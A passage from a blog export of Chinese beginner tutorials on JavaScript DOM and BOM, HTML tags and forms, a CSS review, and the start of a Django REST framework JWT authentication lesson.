document.getElementById(&quot;btn&quot;); //2.注册事件 btn115.onclick=function()&#123; console.log(&#x27;form submit&#x27;); document.forms[0].submit(); &#125;&lt;/script&gt; 1234567//解决方案3：使用window对象window.onload=function () &#123; var btn = document.getElementById(&#x27;btn1&#x27;) btn.onclick=function () &#123; alert(&#x27;一个普普通通的警告框&#x27;) &#125; &#125; 九、DOMDOM是文档对象模型，BOM是浏览器对象模型，前者是浏览器（可看成容器）内的内容进行操作,而后者是对浏览器本身进行操作 1、DOM简介HTML DOM （文档对象模型）：当网页被加载时，浏览器会创建页面的文档对象模型（Document Object Model）。 通过 HTML DOM，可访问 JavaScript HTML 文档的所有元素。 ​ HTML DOM 树 通过可编程的对象模型，JavaScript 获得了足够的能力来创建动态的 HTML。 JavaScript 能够改变页面中的所有 HTML 元素 JavaScript 能够改变页面中的所有 HTML 属性 JavaScript 能够改变页面中的所有 CSS 样式 JavaScript 能够对页面中的所有事件做出反应 牛刀小试： 改变div的背景色 12345678910111213&lt;div style=&quot;background-color: red; margin:0 auto; width: 500px;height: 300px;&quot; id=&quot;div_1&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt; var element = document.getElementById(&quot;div_1&quot;); element.onmouseover = function () &#123; element.style.backgroundColor = &quot;green&quot; &#125; element.onmouseout = function () &#123; element.style.backgroundColor = &quot;red&quot; &#125;&lt;/script&gt; 2、查找HTML元素通常，通过 JavaScript，需要操作 HTML 元素。 因此必须首先找到该元素。有四种方法来： 通过 id 找到 HTML 元素 document.getElementById() 通过标签名找到 HTML 元素 document.getElementsByTagName() 通过类名找到 HTML 元素 document.getElementsByClassName() 通过name属性值找到 HTML 元素 document.getElementsByName() 123456789101112131415&lt;div style=&quot;background-color: red; margin:0 auto; width: 500px;height: 300px;&quot; id=&quot;div_1&quot; class=&quot;div_class&quot; name=&quot;div_name&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt; var element = document.getElementById(&quot;div_1&quot;); //通过id获取 console.log(element) element = document.getElementsByTagName(&quot;div&quot;)[0]; //通过标签名获取（复数） console.log(element) element = document.getElementsByClassName(&quot;div_class&quot;)[0]; //通过标类名获取（复数） console.log(element) element = document.getElementsByName(&quot;div_name&quot;)[0]; //通过name属性值获取（复数） console.log(element)&lt;/script&gt; 标签层级属性： children 获得所有子标签 parentNode 获得父标签 previousElementSibling 获得上一个兄弟标签 nextElementSibling 获得下一个兄弟标签 1234567891011121314151617181920&lt;div style=&quot;background-color: red; margin:0 auto; width: 500px;height: 300px;&quot; id=&quot;div_1&quot;&gt; &lt;p id=&quot;p1&quot;&gt;谁谓伤心画不成，画人心逐世人情。 &lt;/p&gt; &lt;p id=&quot;p2&quot;&gt;君看六幅南朝事，老木寒云满故城。 &lt;/p&gt;&lt;/div&gt;&lt;input type=&quot;button&quot; value=&quot;点我&quot; onclick=&quot;myClick()&quot;&gt; &lt;script type=&quot;text/javascript&quot;&gt; function myClick() &#123; var element = document.getElementById(&quot;div_1&quot;); //通过id获取 console.log(element) var list = element.children; for(var i = 0;i&lt;list.length;i++)&#123; var pe = list[i]; pe.style.color = &#x27;white&#x27;; //将文字颜色改为白色 &#125; &#125;&lt;/script&gt; 3、修改HTML3.1 修改标签内容element.innerHTML &#x3D; xxx 12345678910&lt;div id=&quot;div_1&quot;&gt;为中华之崛起而读书。&lt;/div&gt;&lt;input type=&quot;button&quot; value=&quot;点我&quot; onclick=&quot;myClick()&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt; function myClick() &#123; var element = document.getElementById(&quot;div_1&quot;); element.innerHTML = &quot;读一本好书，就如同和一个高尚的人在交谈。&quot; &#125;&lt;/script&gt; 3.2 修改标签基本属性12345678910111213141516&lt;input type=&quot;button&quot; value=&quot;点我&quot; onclick=&quot;myClick()&quot; id=&quot;btn_1&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt; var yes = true; function myClick() &#123; var element = document.getElementById(&quot;btn_1&quot;); if (yes) &#123; element.value = &quot;别点了&quot; yes = false; &#125;else &#123; element.value = &quot;点我&quot; yes = true; &#125; &#125;&lt;/script&gt; 123456789ele.value=&quot;new_value&quot;; //多用于设置文本框的显示内容ele.name=&quot;new_name&quot;; //修改name属性值ele.href=&quot;new_href&quot;; //可用于修改a标签的链接地址ele.src=&quot;new_src&quot;; //可用于修改img标签的图片......ele.checked=true/false;//适用于radio-button 和 checkbox标签ele.selected=true/false;//适用于select内的option标签、ele.disabled=true/false;//禁用标签，多用于按钮 3.3 修改样式属性12ele.style.height=&quot;50px&quot;; //单独修改标签的某一项css属性.ele.style.backgroundColor=&quot;#abcdef&quot;;//单独修改标签的某一项css属性. 修改的属性为‘background-color’ 4、删除和新增标签4.1 删除标签 removeChild(child) 删除指定的子标签 remove() 删除自身 1234567891011121314&lt;div id=&quot;div_1&quot;&gt; &lt;p&gt;谁谓伤心画不成，画人心逐世人情。&lt;/p&gt; &lt;p&gt;君看六幅南朝事，老木寒云满故城。&lt;/p&gt;&lt;/div&gt;&lt;input type=&quot;button&quot; value=&quot;点我&quot; onclick=&quot;myClick()&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt; function myClick()&#123; var element = document.getElementById(&quot;div_1&quot;); var p1 = element.children[0]; element.removeChild(p1)&#125; 4.2 新增标签 document.createElement(标签名) 创建新标签 document.createTextNode(内容) 创建标签内容 ele.appendChild(标签) 追加子标签 ele.insertBefore(标签) 插入指定标签到ele标签中 123456789101112&lt;input type=&quot;button&quot; value=&quot;点我&quot; onclick=&quot;myClick()&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt;function myClick()&#123; var para = document.createElement(&quot;p&quot;) var text = document.createTextNode(&quot;鸟三顾而后飞，人三思而后行。&quot;) para.appendChild(text) document.getElementsByTagName(&quot;body&quot;)[0].appendChild(para)&#125;&lt;/script&gt; 十、BOM1、简介1.1 概念BOM 是 Browser Object Model，浏览器对象模型。 BOM提供了独立于内容 而与浏览器窗口进行交互的对象； 由于BOM主要用于管理窗口与窗口之间的通讯，因此其核心对象是window； BOM由一系列相关的对象构成，并且每个对象都提供了很多方法与属性； 1.2 学什么我们将学到与浏览器窗口交互的一些对象，例如可以移动、调整浏览器大小的window对象，可以用于导航的location对象与history对象，可以获取浏览器、操作系统与用户屏幕信息的navigator与screen对象，可以使用document作为访问HTML文档的入口，管理框架的frames对象等。 2、Window对象Window 对象是 JavaScript 层级中的顶层对象。 Window 对象代表一个浏览器窗口或一个框架 window.alert(“警告”) 警告框 window.confirm(“xxx”) 确认框，根据用户的选择，返回bool值 1234var y = window.confirm(&quot;提示消息：是否删除xxx&quot;)if (y) &#123; console.log(&#x27;...&#x27;)&#125; window.prompt(“xxx”) 提示杠，收集用户的输入 12var txt = window.prompt(&quot;请输入&quot;)console.log(txt); window.onload &#x3D; function(){ …} 注册onload事件 3、History对象（了解） window.history.forward() 在浏览历史里前进一步 window.history.back() 在浏览历史里后退一步 4、Screen对象 window.screen.width 屏幕宽度 window.screen.height 屏幕高度 5、Navigator对象 window.navigator.appVersion 浏览器版本 6、Location对象 window.location.href 载入页面–当前载入页面的完整UR 1window.location.href = &quot;http://www.baidu.com&quot; 7、Document对象 document.getElement….(..) 选择标签 document.forms[0] 选择文档中的form document.write(“hello”) &#x3D;&#x3D; 向文档中写入内容，会覆盖所有之前的 (了解) 补充： 计时器 var id1 = setInterval(function()&#123;...&#125;,1000) ; 每1000毫秒执行一次function，返回事件的id var id2 = setTimeout(function()&#123;...&#125;,1000); 1000毫秒后仅执行一次function，返回事件的id clearTimeout(id2); 移除事件 clearInterval(id1); 移除事件 如何在网页上显示当前时间？","categories":[],"tags":[]},{"title":"","slug":"html_css回顾整理","date":"2024-10-24T11:20:58.364Z","updated":"2024-10-07T05:20:53.240Z","comments":true,"path":"2024/10/24/html_css回顾整理/","permalink":"http://example.com/2024/10/24/html_css%E5%9B%9E%E9%A1%BE%E6%95%B4%E7%90%86/","excerpt":"","text":"html1234567891011121314151617181920212223242526meta：元数据 定义网页的设置title：网页的标题br：换行hr：分割线h1-h6:标题p:段落b:粗体字i:斜体u:下划线del/s:删除线sup:上标文字sub:下标文字img:src? 相对 网络路径 alt? title?a:href? 完整url # #id html文件相对路径 html文件相对路径#id target: _self _blankul:-&gt;li type?ol:-&gt;li type? 1 A a i Idl:dt-&gt;ddtable:-&gt;tr-&gt;td border? cellspacing ? cellpadding? tr: align? 文字水平对齐方式 valign文字垂直对齐方式td: rowspan?前一个td上加rowspan colspan?caption: 表格标题 加粗 居中thead:-&gt;tr-&gt;th 定义表格的表头 加粗 居中form:-&gt; action 表单要被提交到的服务器的urlinput: type-&gt;text,password,radio,checkbox,submit,reset,file,button,date,textarea :文本域 placeholderselect:-&gt;option selected css1234567891011121314151617181920212223242526272829303132333435363738394041424344插入css 样式三种方式: 1.内部 2.内联 3.外部选择器 1.元素 元素名 2.类选择器 .类名 3.id选择器 #id名 4.派生选择器 1标签 2标签 5.儿子选择器 1标签&gt;2标签 6.毗邻选择器 1标签+2标签 同级 7.弟弟选择器 1标签~2标签 同级 8.属性选择器 1.[属性名] 2.[属性名=值] 3.标签名[属性名=值] 9.伪类 标签名:hover input:focus背景样式 background-color background-img文本样式 text文字样式 font盒子模型 padding 内边距 内容与边框的距离 margin 外边距 盒子与盒子的距离 border 边框 定位 相对 相对自身原来位置做偏移 position:relative top 绝对 div1 div2 如果想让div2固定在div1要给这个div1加一个position(前提div1是div2的父标签) position:absolute 固定 固定在浏览器窗口上 position:fixed top: 浮动 清除浮动","categories":[],"tags":[]},{"title":"","slug":"HTML","date":"2024-10-24T11:20:58.362Z","updated":"2024-10-07T05:20:53.209Z","comments":true,"path":"2024/10/24/HTML/","permalink":"http://example.com/2024/10/24/HTML/","excerpt":"","text":"HTML一、HTML简介HTML 俗称网页，就是我们打开浏览器访问任何一个网站所看到的都是由 HTML 页面提供的（或者与 HTML 技术相关的内容提供）。 HTML 全称为 HyperText Markup Language，被译为超文本标记语言。所谓的超文本就是不仅只有文本内容，包括链接、音频和视频等内容。所谓标记语言，简单来说就是元素。也就是说，HTML 提供一系列的元素来构成一个页面中最基础的内容。 HTML 是一种描述 Web 文档结构和语义的语言，它由元素组成，每个元素可以有一些属性或文本。 当你保存 HTML 文件时，既可以使用 .htm 也可以使用 .html 文件后缀。 二、第一张网页一个页面有且只有一个根标签是html， 元素一般包含 和 两个元素，也就是 HTML 的头部和主体内容。 123456789&lt;html&gt; &lt;head&gt; &lt;title&gt;网页的标题&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- 这是一个文本框 --&gt; &lt;input type=&quot;text&quot;&gt;&lt;/input&gt; &lt;/body&gt;&lt;/html&gt; HTML标签：由尖括号包围： 成对出现： &lt;p&gt;&lt;/p&gt; ,即开标签和闭标签. 属性： 定义在开标签中，如input标签中的type属性 简写： 开闭标签之间的内容是标签体，如果标签体为空，则可以简写： 注释： 是注释标签 HTML文档在浏览器中被解释运行,展示的不是源码而是渲染之后的效果 三、HTML头部&lt; head &gt; 元素包含了当前 HTML 页面的所有头部元素，在 &lt; head &gt; 元素内必须定义 &lt; title &gt; 元素，还可以定义 &lt; script &gt;、&lt; link &gt; 等元素。 这些 HTML 的头部元素定义了当前页面的标题、编码、使用的脚本或样式等信息。 1、title元素&lt; title &gt;元素定义了当前HTML页面的标题 1&lt;title&gt;百度一下，你就知道&lt;/title&gt; 2、meta元素 元素提供了 HTML 页面的元数据（Metadata），元数据是存储数据的信息。 通常用于设置页面的编码、描述、关键词、作者等信息。 元素不会显示在页面中，但会被浏览器解析。 2.1 定义网页内容的编码格式1&lt;meta charset=&quot;utf-8&quot;&gt; 2.2 定义HTML页面关键字，用于搜索引擎1&lt;meta name=&quot;keywords&quot; content=&quot;HTML,CSS,XML,JavaScript&quot;&gt; 2.3 定义HTML页面描述1&lt;meta name=&quot;description&quot; content=&quot;百知教育IT培训,java培训,PHP培训,UI培训,H5培训,linux培训,大数据培训,Python人工智能,IT行业培训领跑者,高薪就业 &quot;&gt; 2.4 定义HTML页面作者1&lt;meta name=&quot;author&quot; content=&quot;百知教育&quot;&gt; 四、HTML主体1、body元素 标签定义文档的主体。 元素包含文档的所有内容（比如文本、超链接、图像、表格和列表等等）。body元素中包含的内容（子标签）是用户可以看到的。 一个 HTML 文件只能存在一个 标签。 2、HTML元素基本构成2.1 元素类型HTML 是标记语言，所谓标记就是指页面中的元素（元素也可以叫做标签）。一个完整的 HTML 页面都是由众多不同的元素组成的。 闭合元素：必须包含开始元素和结束元素，如果没有结束元素会产生意料之外的错误。 12&lt;title&gt;百知教育Python人工智能培训&lt;/title&gt;&lt;p&gt;这是一个段落标签&lt;/p&gt; &lt;!--该标签的作用是表示一个段落，会有换行--&gt; 空元素：也可以叫做单元素，只需要开始元素，而不需要结束元素。 123&lt;meta name=&quot;description&quot; content=&quot;渥瑞达Web前端培训&quot;&gt;&lt;br/&gt; &lt;!-- 换行 -- &gt; ​ 2.2 HTML属性属性是设置在HTML元素中的，用于为元素添加附加信息。属性一般都是定义在开始元素中，并且是以“名称&#x2F;值”对出现 123&lt;input type=&quot;text&quot; /&gt; &lt;!-- 这是一个文本框 --&gt;&lt;input type=&quot;button&quot; value=&quot;点我&quot; /&gt; &lt;!-- 这是一个按钮 --&gt; 五、HTML文本1、标题元素HTML 提供了 6 个标题元素，由大到小依次为 &lt;h1&gt; 到 &lt;h6&gt; 1234567891011&lt;h1&gt;这是一级标题&lt;/h1&gt;&lt;h2&gt;这是二级标题&lt;/h2&gt;&lt;h3&gt;这是三级标题&lt;/h3&gt;&lt;h4&gt;这是四级标题&lt;/h4&gt;&lt;h5&gt;这是五级标题&lt;/h5&gt;&lt;h6&gt;这是六级标题&lt;/h6&gt; 2、段落元素定义段落 : **浏览器会自动地在段落的前后添加空行** 1234567&lt;p&gt; 这是一个段落. &lt;/p&gt;&lt;p&gt;这是另一个段落.&lt;/p&gt; 注意： 在html中手动换行无效 3、换行 元素定义的段落内容是不会自动换行的，如果换行需要使用 br 元素 12345&lt;body&gt; 生活赋予我们一种巨大的和无限高贵的礼品，这就是青春：充满着力量，充满着期待志愿，充满着求知和斗争的志向，充满着希望信心和青春。 &lt;br&gt; 人所缺乏的不是才干而是志向，不是成功的能力而是勤劳的意志。&lt;/body&gt; 4、水平线在浏览器中显示一条水平线（分隔线）效果。 属性：size&#x3D;“10” color&#x3D;”red” width&#x3D;”100px 或者 50%” align&#x3D;”left&#x2F;right&#x2F;center” ​ 10像素高 颜色 宽度 对齐方式 123456&lt;body&gt; 生活赋予我们一种巨大的和无限高贵的礼品，这就是青春：充满着力量，充满着期待志愿，充满着求知和斗争的志向，充满着希望信心和青春。 &lt;br&gt; &lt;hr size=&quot;1&quot; width=&quot;100%&quot; color=&quot;red&quot;/&gt; 人所缺乏的不是才干而是志向，不是成功的能力而是勤劳的意志。&lt;/body&gt; 5、文本修饰5.1 粗体字12345这是一段正常未加粗的文本内容.&lt;br&gt;&lt;b&gt;这是一段加粗之后的文本内容.&lt;/b&gt;&lt;br&gt;&lt;strong&gt;粗体--着重强调&lt;/strong&gt; 5.2 斜体字1&lt;i&gt;这是一段斜体的文本内容.&lt;/i&gt; 5.3 下划线123&lt;body&gt; 证明人：&lt;u&gt;百知教育&lt;/u&gt;&lt;/body&gt; 5.4 删除线123&lt;body&gt; &lt;del&gt;这是一段要被删除的文字&lt;/del&gt;&lt;/body&gt; 5.5 下标文字123&lt;body&gt; H&lt;sub&gt;2&lt;/sub&gt;O&lt;/body&gt; 5.6 上标文字 32 = 9 5.7 小号字12正常文字&lt;small&gt;小号文字&lt;/small&gt; 5.8 大号字12345&lt;body&gt; &lt;small&gt;小号文字&lt;/small&gt; 正常文字 &lt;big&gt;大号文字&lt;/big&gt;&lt;/body&gt; 六、图像与链接1、图像元素 元素引入外部图像， 元素是空元素。 1.1 src属性​ src 属性（必需），表示引入图像的 URL 地址。 1&lt;img src=&quot;images/img.png&quot;&gt; 图像可以是本地地址，也可以是网络地址。 1&lt;img src=&quot;https://himg.bdimg.com/sys/portrait/item/c8764d725f6c6963656e6365g872fc876872f.jpg&quot;&gt; 1.2 图像大小width 和 height 属性用于设置图像显示的宽度和高度。 1&lt;img src=&quot;img.png&quot; width=&quot;350&quot; height=&quot;233&quot; /&gt; 1.3 图像定位(了解)align 属性用于设置图像显示的位置。 left：水平方向居左。 right：水平方向居右。 top：垂直方向居上。 bottom：垂直方向居下。 middle：居中。 1&lt;img src=&quot;img.png&quot; width=&quot;350&quot; height=&quot;233&quot; align=&quot;right&quot; /&gt; 1.4 alt属性1&lt;img src=&quot;abcdef.png&quot; alt=&quot;无法加载图片&quot;/&gt; 2、超链接2.1 用法href 属性（必需），表示指定跳转的 URL 地址 1&lt;a href=&quot;http://www.baizhiedu.com&quot;&gt;百知教育&lt;/a&gt; 2.2 打开方式： target 属性 元素的 target 属性用于设置链接的打开方式。 _blank：在新窗口打开链接。 _self：在当前窗口打开链接。 1&lt;a href=&quot;http://www.baizhiedu.com&quot; target=&quot;_blank&quot;&gt;百知教育&lt;/a&gt; 2.3 锚点123456789&lt;body&gt; &lt;a name=&quot;postion&quot;&gt;&lt;/a&gt; &lt;!-- 定义锚点 --&gt; &lt;!-- 页面其它内容 ... ... ... --&gt; &lt;a href=&quot;#postion&quot;&gt;定位到postion的位置&lt;/a&gt; &lt;!-- 链接到锚点 --&gt;&lt;/body&gt; 2.4 回到顶部的空链接12345678&lt;body&gt; &lt;!-- 页面其它内容 ... ... ... --&gt; &lt;a href=&quot;#&quot;&gt;回到顶部&lt;/a&gt; &lt;!-- 回到顶部 --&gt;&lt;/body&gt; 七、列表1、无序列表1.1 定义无序列表 元素定义无序列表，用于列出页面上没有特定次序的条目。 12345&lt;ul&gt; &lt;li&gt;北京市&lt;/li&gt; &lt;li&gt;上海市&lt;/li&gt; &lt;li&gt;重庆市&lt;/li&gt;&lt;/ul&gt; 1.2 type属性定义列表的项目符号的类型 disc：实心圆，默认值。 circle：空心圆。 square：实心矩形。 12345&lt;ul type=&quot;circle&quot;&gt; &lt;li&gt;北京市&lt;/li&gt; &lt;li&gt;上海市&lt;/li&gt; &lt;li&gt;重庆市&lt;/li&gt;&lt;/ul&gt; 2、有序列表2.1 定义有序列表12345&lt;ol&gt; &lt;li&gt;北京市&lt;/li&gt; &lt;li&gt;上海市&lt;/li&gt; &lt;li&gt;重庆市&lt;/li&gt;&lt;/ol&gt; 2.2 type属性 1：数字值，默认值。 a 或 A：小写或大写字母。 i 或 I：小写或大写罗马数字。 12345&lt;ol type=&quot;a&quot;&gt; &lt;li&gt;北京市&lt;/li&gt; &lt;li&gt;上海市&lt;/li&gt; &lt;li&gt;重庆市&lt;/li&gt;&lt;/ol&gt; 3、自定义列表八、表格1、表格使用表格由 &lt; table &gt; 标签来定义。每个表格均有若干行（由 标签定义），每行被分割为若干单元格（由 标签定义）。 12345678910&lt;table&gt; &lt;tr&gt; &lt;td&gt;第1行，第1列&lt;/td&gt; &lt;td&gt;第1行，第2列&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;第2行，第1列&lt;/td&gt; &lt;td&gt;第2行，第2列&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 2、表格属性 属性名称 描述 width 和 height 设置表格的宽度和高度 align 设置表格的对齐方式 border 设置表格的边框宽度 bgcolor 设置表格的背景颜色 cellpadding 设置内边距（单元格边框与内容之间的距离） cellspacing 设置外边距（单元格之间的距离） bordercolor 边框颜色 12345678910&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; bgcolor=&quot;gray&quot; bordercolor=&quot;red&quot; width=&quot;300px&quot; height=&quot;100px&quot; align=&quot;left&quot;&gt; &lt;tr&gt; &lt;td&gt;第1行，第1列&lt;/td&gt; &lt;td&gt;第1行，第2列&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;第2行，第1列&lt;/td&gt; &lt;td&gt;第2行，第2列&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 3、tr元素 属性名称 值 描述 align right、left、center 左右对齐方式 valign top 、middle 、bottom 垂直对齐方式 bgcolor rgb(xxx,xxx,xxx)、colorName 背景颜色 12345678910&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; width=&quot;500px&quot; height=&quot;100px&quot;&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;第1行，第1列&lt;/td&gt; &lt;td&gt;第1行，第2列&lt;/td&gt; &lt;/tr&gt; &lt;tr align=&quot;right&quot; valign=&quot;top&quot; bgcolor=&quot;blue&quot;&gt; &lt;td&gt;第2行，第1列&lt;/td&gt; &lt;td&gt;第2行，第2列&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 4、td元素 元素是定义表格的数据单元格。 属性名称 值 描述 align right、center、left 设置水平对齐方式 valign top、middle、bottom 设置垂直对齐方式 width和height pixels 、% 设置单元格的宽和高 colspan和rowspan number 设置单元格的跨列和跨行数量 bgcolor rbg()、colorName 单元格背景色 12345678910&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; width=&quot;500px&quot; height=&quot;100px&quot;&gt; &lt;tr&gt; &lt;td align=&quot;center&quot;&gt;第1行，第1列&lt;/td&gt; &lt;td valign=&quot;top&quot;&gt;第1行，第2列&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width=&quot;300px&quot;&gt;第2行，第1列&lt;/td&gt; &lt;td bgcolor=&#x27;red&#x27;&gt;第2行，第2列&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 合并行和列 12345678910111213141516&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; width=&quot;500px&quot; height=&quot;200px&quot;&gt; &lt;tr&gt; &lt;td&gt;第1行，第1列&lt;/td&gt; &lt;td&gt;第1行，第2列&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=&quot;2&quot;&gt;第2行，第1列&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;第3行，第1列&lt;/td&gt; &lt;td rowspan=&quot;2&quot;&gt;第3行，第2列&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;第4行，第1列&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 5、表格标题caption 元素用于定义表格的标题，必须紧随 元素之后，且只能对每个表格定义一个标题。 1234567891011&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; width=&quot;500px&quot; height=&quot;100px&quot;&gt; &lt;caption&gt;表格标题&lt;/caption&gt; &lt;tr&gt; &lt;td&gt;第1行，第1列&lt;/td&gt; &lt;td&gt;第1行，第2列&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;第2行，第1列&lt;/td&gt; &lt;td&gt;第2行，第2列&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 6、表头thead、tbody表主体、tfoot表脚注 标签定义表格的表头。 1234567891011121314151617&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; width=&quot;500px&quot; height=&quot;100px&quot;&gt; &lt;caption&gt;信息&lt;/caption&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;!-- 定义表头单元格 会加粗显示 --&gt; &lt;th&gt;性别&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tr&gt; &lt;td&gt;Tom&lt;/td&gt; &lt;td&gt;boy&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Linda&lt;/td&gt; &lt;td&gt;girl&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; tfoot 元素应该与 thead 和 tbody 元素结合起来使用。 （比较少用） 九、表单1、form 元素表单用标签描述，表单内部可以有多个子标签，用来完成用户信息的收集，并发送请求给服务器。 属性：action&#x3D;“xxx” method&#x3D;”get&#x2F;post” ​ 请求地址 请求方式 123456http://www.baidu.com?uname=abc&amp;passwd=123&lt;form action=&quot;http://www.baidu.com&quot; method=&quot;get&quot;&gt; username:&lt;input type=&quot;text&quot; name=&quot;uname&quot; id=&quot;uname115&quot;/&gt;&lt;br/&gt; # abc password:&lt;input type=&quot;text&quot; name=&quot;passwd&quot; id=&quot;pwd115&quot;/&gt;&lt;br/&gt; # 123 &lt;input type=&quot;submit&quot; value=&quot;提交&quot; id=&quot;sub115&quot;/&gt;&lt;/form&gt; 2、表单元素 元素有很多不同类型，根据不同的 type 属性来决定。 1用户名：&lt;input type=&quot;text&quot; name=&quot;txt&quot; /&gt; &lt;!-- text表示文本框--&gt; type属性： 类型名称 描述 text 文本输入框 password 密码框 radio 单选按钮 checkbox 复选框 button 按钮 submit 提交按钮 reset 重置按钮 file 文件域 name属性 ：标签的普通的属性，相当于别名，是每个输入控件的重要属性&#x3D;&#x3D;请求参数名。 id属性 ： 标签的唯一标识名，不能重复。 value属性 ：标签的普通属性，是重要属性&#x3D;&#x3D;请求参数值。 2.1 文本框1用户名：&lt;input type=&quot;text&quot; name=&quot;txt&quot; /&gt; &lt;!-- text表示文本框--&gt; 1用户名：&lt;input type=&quot;text&quot; name=&quot;pwd&quot; value=&quot;Mr_lee&quot; maxlength=&quot;10&quot; readonly=&quot;readonly&quot; /&gt; 2.2 密码框1密码：&lt;input type=&quot;password&quot; name=&quot;pwd&quot; value=&quot;123456&quot; /&gt; 2.3 单选按钮123&lt;!-- name：值必须一样，value：表示提交表单时的值 checked:默认选中--&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;1&quot;&gt;男 &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;0&quot; checked=&quot;checked&quot;&gt;女 2.4 复选框1234&lt;input type=&quot;checkbox&quot; name=&quot;course&quot; value=&quot;Mysql&quot;&gt;Mysql&lt;input type=&quot;checkbox&quot; name=&quot;course&quot; value=&quot;HTML&quot;&gt;HTML&lt;input type=&quot;checkbox&quot; name=&quot;course&quot; value=&quot;Linux&quot;&gt;Linux&lt;input type=&quot;checkbox&quot; name=&quot;course&quot; value=&quot;Django&quot;&gt;Django 2.5 按钮1&lt;input type=&quot;button&quot; name=&quot;btn&quot; value=&quot;点我&quot;&gt; 2.6 提交按钮1&lt;input type=&quot;submit&quot; name=&quot;sub_btn&quot; value=&quot;提交&quot;&gt; 2.7 重置按钮1&lt;input type=&quot;reset&quot; name=&quot;set_btn&quot; value=&quot;重置&quot;&gt; 2.8 文件域 1&lt;input type=&quot;file&quot;&gt; 2.9 文本域1&lt;textarea name=&quot;txtInfo&quot; rows=&quot;4&quot; cols=&quot;20&quot;&gt;&lt;/textarea&gt; 3、下拉选框123456选择课程：&lt;select name=&quot;course&quot;&gt; &lt;option value=&quot;1&quot;&gt;Java&lt;/option&gt; &lt;option value=&quot;2&quot; selected=&quot;selected&quot;&gt;C++&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;PHP&lt;/option&gt;&lt;/select&gt; 4、表单综合实例 十、特殊符号 显示结果 描述 实体名称 空格 &nbsp; &lt; 小于号 &lt; &gt; 大于号 &gt; © 版权（copyright） &copy; ® 注册商标 &reg; ™ 商标 &trade;","categories":[],"tags":[]},{"title":"","slug":"drf-day6","date":"2024-10-24T11:20:58.360Z","updated":"2024-10-07T05:21:29.555Z","comments":true,"path":"2024/10/24/drf-day6/","permalink":"http://example.com/2024/10/24/drf-day6/","excerpt":"","text":"drf-day61. 请求安全认证传统安全认证 前后端分离 Token认证方式 1234# 服务端验证的优点： 1. 服务端不需要储存token，token交给每一个客户端储存，服务器压力小 2. 服务器做的是 签发token与校验token的两段算法，签发认证的效率高 3. 算法在集群同步的成本低 2. JWT（Json web token）github文档：https://github.com/jpadilla/django-rest-framework-jwt JWT构成 JWT是由三段信息构成的，将这三段信息文本用.链接一起就构成了Jwt字符串 例如：abc.admin.123：头部.载荷.签名 1234567891011# jwt构成介绍 第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature). # jwt每一部分都是由一个json字典加密后形成的字符串# 头部和载荷采用的是base64可逆加密（前后台都可以解密）# 签名采用的是sha256不可逆加密eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ header 声明类型，这里是jwt 声明加密的算法 通常直接使用 HMAC SHA256 123456&#123; &#x27;typ&#x27;: &#x27;JWT&#x27;, &#x27;alg&#x27;: &#x27;HS256&#x27;&#125;# 然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分.eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 payload 载荷就是存放有效信息的地方。 可以保存用户信息，方便在服务端进行反解析 signature header (base64后的) payload (base64后的) secret 由以上三个字段串拼接后再使用不可逆的加密算法sha256进行加密 1# 注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。 JWT的使用 pip install djangorestframework-jwt 源码剖析 token签发的入口 JSONWebTokenAPIView中的post方法 1234567891011121314151617181920212223# 签发的token的视图请求# 接受前端的登陆请求并解析参数来调用对应的序列化器def post(self, request, *args, **kwargs): # 将前端传递的数据交给序列化器来完成数据的反序列化 serializer = self.get_serializer(data=request.data) if serializer.is_valid(): # 从序列列化器中解析出当前用户信息与token user = serializer.object.get(&#x27;user&#x27;) or request.user token = serializer.object.get(&#x27;token&#x27;) response_data = jwt_response_payload_handler(token, user, request) # Response初始化 将token响应回去 response = Response(response_data) if api_settings.JWT_AUTH_COOKIE: expiration = (datetime.utcnow() + 